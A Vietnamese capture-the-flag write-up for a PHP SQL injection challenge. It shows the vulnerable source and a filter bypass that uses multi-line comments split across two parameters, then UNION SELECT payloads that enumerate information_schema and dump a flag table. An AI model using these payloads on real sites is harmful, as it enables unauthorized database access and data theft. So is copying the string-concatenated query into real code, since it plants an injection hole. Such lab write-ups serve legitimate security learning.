# [CTF] sqli v1
## Solution
Source code:
```
<?php
require 'config.php';
// ?amount=10000&name=tivi
if (isset($_GET['amount']) && isset($_GET['name'])) {
    $amount = $_GET['amount'];
    $name = $_GET['name'];

    if (preg_match("/[a-zA-Z]|\'|\"/", $amount))
        die("amount must be a number!");

    if (preg_match("/[\"|\'|\`]/", $name)) 
        die("name must a string");

    $query = "select * from products where amount=".$amount." and name=\"".$name."\"";
    #echo $query;
}
else{
    show_source(__FILE__);
    exit();
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>SQL injection</title>
</head>
<body>
    <table style="width:100%">
        <tr>
            <th>id</th>
            <th>name</th>
            <th>amount</th>
        </tr>
        <?php
            $result = $conn->query($query);
            if ($result->num_rows > 0) {
                while($row = $result->fetch_assoc()) {
                    echo "<tr>".
                    "<td>".$row["id"]."</td>".
                    "<td>".$row["name"]."</td>".
                    "<td>".$row["amount"]."</td>".
                    "</tr>";
                }
            } else {
                echo "0 results";
            }
        ?>
    </table> 
</body>
</html>
```
Như title, đây là 1 bài về sqli,truớc tiên ta check qua source code:
- có tất cả 2 param là ``amount`` và ``name`` đều có khả năng bị inject.
- Ở đây có 2 cái filter khá là chí mạng, nó lọc hết dấu ngoặc đơn và kép, ở param ``amount`` thì lọc cả letters
```
    if (preg_match("/[a-zA-Z]|'|\"/", $amount))
        die("amount must be a number!");

    if (preg_match("/[\"|'|`]/", $name)) 
        die("name must a string");
``` 
Ban đầu payload mình dùng là ``1|| 1=1-- -`` thì extract đuợc bảng products này, nhưng mà có vẻ flag không nằm ở đây.

![img](./img/Screenshot%20from%202022-03-04%2000-11-54.png)

Sau khi tra anh google 1 hồi thì có vẻ là có thể bypass thông qua kí tự ``\`` , kí tự này sẽ coi kí tự tiếp theo cụ thể là ``"`` là input và khiến cho cả phần sau: ``" and name`` cũng thuộc về input của param. Nhưng mà cách này không hiệu quả vì cái blacklist kia nó lọc cả letters nữa... Mình còn thử vận lộn với đủ loại trò như là toán tử bitwise, dùng ``~`` để reverse string, homoglyph attack, convert octal , blo bla đều không đưọc.. 

Cuối cùng,hóa ra còn 1 cách đáp ứng đưọc cái blacklist kia mà mình chưa thử, đấy là dùng ``multi-line comments`` :). Cụ thể payload sẽ là:

```
?amount=1/*&username=1*/ or 1=1 -- -
```
Thì query sẽ có dạng:
```
select * from products where amount=1 /* and name=*/ or 1=1 -- -
```
Tadda:

![img](./img/Screenshot%20from%202022-03-04%2000-20-24.png)

Việt cần làm bây giờ là chỉ còn là dump hết dữ liệu ra thoy

Extract database:
```
?amount=10000/*&name=*/ UNION SELECT 1,2,database() -- -
```
![img](./img/Screenshot%20from%202022-03-04%2000-24-18.png)

Extract tables: ()
```
?amount=10000/*&name=*/ UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema like 0x73716c696e6a656374696f6e -- -
```
![img](./img/Screenshot%20from%202022-03-04%2000-30-32.png)

Extract columns:
```
amount=10000/*&name=*/ UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name like 0x666c61677461626c656168696869686f686f  -- -
```
![img](./img/Screenshot%20from%202022-03-04%2000-32-43.png)

dump het ra thui:
```
?amount=10000/*&name=*/ UNION SELECT 1,2,group_concat(flag) FROM flagtableahihihoho -- -
```
![img](./img/Screenshot%20from%202022-03-04%2000-34-25.png)